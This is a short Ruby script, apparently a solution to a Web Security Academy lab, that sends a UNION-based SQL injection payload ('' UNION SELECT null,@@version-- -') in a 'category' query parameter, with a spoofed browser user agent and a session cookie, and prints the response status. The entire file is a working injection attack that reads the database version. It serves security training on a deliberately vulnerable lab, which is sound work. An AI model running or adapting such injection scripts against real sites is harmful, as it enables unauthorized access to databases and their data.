require 'http'

payload = "' UNION SELECT null,@@version-- -"

url = "https://0adf0020034ede2b805c801e002100ff.web-security-academy.net/filter"

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
	)
	.cookies(
		:session => "vkzFJrCNhuafZOSDi6g6dyinW531AvRd"
	)

resp = client.get url,:params => {:category => "Pets#{payload}"}

puts resp.status
